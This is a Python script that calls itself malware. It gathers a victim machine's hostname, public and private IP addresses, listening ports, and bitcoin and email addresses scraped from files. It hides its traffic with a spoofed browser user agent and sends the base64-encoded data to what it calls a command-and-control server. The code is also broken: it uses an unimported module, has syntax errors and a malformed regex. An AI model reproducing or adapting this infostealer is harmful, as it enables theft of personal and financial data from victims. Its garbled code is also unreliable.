#this is the gzip encoded malware
import requests
import socket
import json
import re
import os

def main():
	hostname = socket.gethostname()
	os_architecture = os.system("wmic os get osarchitecture")

	#we get get private and public ipaddress

	#this is necessary so that the request doesnt get flagged
	headers = {
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
	}

	public_ipaddress =  requests.get("https://ipapi.co/ip", headers= headers).text

	private_ipaddress = socket.gethostbyname(socket.gethostname())

	bitcoin_addrss_list = []
	email_address_list = []

	for root, dirs, files in os.walk("/directory"):
		for file in files:
			file_fd = open("{}/{}".format(root, file), "r")
			try:
				file_contents = file_fd.read().strip()

				#this searches for btc address
				bitcoin_addrss = re.findall(r"([13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})", file_contents)

				email_address = re.findall("r[a-z0-9._]+@[a-z0-9]+\.[a-z]{1,7}", file_contents)

				if len(bitcoin_addrss) > 0:
					bitcoin_addrss_list += bitcoin_addrss

				if len(email_address) > 0:
					email_address_list += email_address

				file_fd.close()

			except Exception as e:
				print(e)
				pass

	#get all open ports on the victim machine
	open_ports = os.popen("netstat -plant | grep -i listen | awk  "{print $4}" | grep -P '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}' ")
	open_ports = open_ports.strip().split("\n")

	data = {
		"machine_hostname" : hostname,
		"machine_public_ip" : public_ipaddress,
		"machine_private_ip" : private_ipaddress,
		"btc_address_found" : bitcoin_addrss_list,
		"email_addresses_found" : email_address_list
	}

	
	encoded_data = base64.b64encode(json.dumps(data).encode())
	#send it to command and control server
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((127.0.0.1, 1333))
	s.send(encoded_data)
	s.close()

if __name__ == '__main__':
	main()
